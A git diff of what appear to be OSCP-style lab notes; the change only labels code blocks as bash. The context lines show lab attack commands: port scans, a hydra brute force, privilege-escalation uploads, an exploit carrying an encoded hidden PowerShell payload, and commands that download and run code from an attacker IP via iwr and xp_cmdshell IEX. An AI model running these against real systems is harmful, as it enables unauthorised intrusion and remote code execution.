@@ -3,7 +3,7 @@ nmap 192.168.194.147 192.168.194.149-151
 ```
 
 .147
-```
+```bash
 nmap -sT -A MS01.oscp.exam
 whatweb MS01.oscp.exam:8080
 whatweb MS01.oscp.exam:8000
@@ -164,7 +164,7 @@ hydra -l kiero -P probable-v2-top12000.txt 192.168.211.149 ftp
 ```
 
 .149 privesc
-```
+```bash
 scp -i id_rsa linpeas.sh john@192.168.211.149:/home/john
 
 # get linux kernel version
@@ -192,7 +192,7 @@ scp -i id_rsa exploit john@192.168.211.149:/home/john
 ```
 
 .150
-```
+```bash
 nmap 192.168.190.150
 nmap -sT -A -p 22,8080 192.168.190.150
 nmap -p 1000-10000 192.168.211.150
@@ -256,7 +256,7 @@ nc 127.0.0.1 5000
 ```
 
 .151
-```
+```bash
 nmap 192.168.190.151
 nmap -sT -A -p 80,3389,8021 192.168.190.151
 nmap -p 1000-10000 192.168.190.150
@@ -285,7 +285,7 @@ python3 47799.py 192.168.190.151 "powershell -nop -w hidden -e JABjAGwAaQBlAG4Ad
 ```
 
 .151 privesc
-```
+```bash
 whoami /priv
 # we have SeImpersonate so we can try potatoes
 
@@ -320,7 +320,7 @@ iwr -uri http://192.168.45.234/agent.exe -Outfile agent.exe
 ```
 
 .148
-```
+```bash
 nmap -Pn 10.10.80.148
 nmap -Pn -p 1000-10000 10.10.80.148
 # sql_svc - Dolphin1
@@ -363,7 +363,7 @@ xp_cmdshell powershell IEX(New-Object System.Net.WebClient).DownloadString(\"htt
     NOTE: Make sure to use the right network interface IP address when trying to reach from MACHINE02 to MACHINE01. The subnet of both the machine IPs should be same. (edited)
 
 port forwarding cheat sheet: https://www.hackingarticles.in/port-forwarding-tunnelling-cheatsheet/
-```
+```bash
 # listening socket then forwarding socket, then ssh server - run this from kali to forward port 4444 on kali to a new port 4444 on web svc. sql service can only talk to web service, but not kali
 ssh -N -R 4444:127.0.0.1:4444 web_svc@192.168.220.147
 
